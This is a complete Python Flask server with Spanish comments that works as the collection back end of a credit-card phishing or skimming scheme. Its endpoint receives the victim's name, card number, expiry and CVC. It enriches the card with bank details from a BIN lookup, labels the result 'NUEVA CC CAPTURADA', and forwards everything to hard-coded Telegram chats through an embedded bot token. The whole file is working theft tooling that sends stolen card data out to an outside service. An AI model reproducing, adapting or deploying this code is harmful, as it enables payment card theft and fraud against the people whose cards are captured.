import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
ALLOWED_RECEIVERS = ['6953415010', '7707049896']

# --- FUNCIÓN PARA CONSULTAR EL BANCO (BIN LOOKUP) ---
def get_bank_info(card_number):
    try:
        # Tomamos los primeros 6 dígitos (el BIN)
        bin_number = card_number[:6]
        # Consultamos la API pública (sin registro)
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            bank = data.get('scheme', 'Desconocido').upper() # Marca (Visa/Mastercard)
            type_card = data.get('type', 'Desconocido').upper() # DEBIT/CREDIT
            country = data.get('country', {}).get('name', 'Desconocido')
            bank_name = data.get('bank', {}).get('name', 'Banco Desconocido')
            
            return f"{bank_name} | {type_card} | {country}"
        else:
            return "Banco: Desconocido | Tipo: Desconocido"
    except:
        # Si la API falla o es muy lenta, no bloqueamos el proceso, solo decimos desconocido
        return "Banco: Error al consultar"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    target_id = str(data.get('target_id'))

    if target_id not in ALLOWED_RECEIVERS:
        return jsonify({"status": "ignored"}), 200

    # 1. Capturar datos de la web
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 2. CONSULTA AUTOMÁTICA DEL BANCO
    print(f"🔍 Consultando banco para la tarjeta: {tarjeta[:6]}...")
    info_banco = get_bank_info(tarjeta)

    # 3. Formatear el mensaje PRO con la info del banco
    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": target_id,
        "text": mensaje,
        "parse_mode": "Markdown"
    }

    try:
        requests.post(url_telegram, json=payload)
        print(f"✅ Datos enviados con éxito al ID: {target_id}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
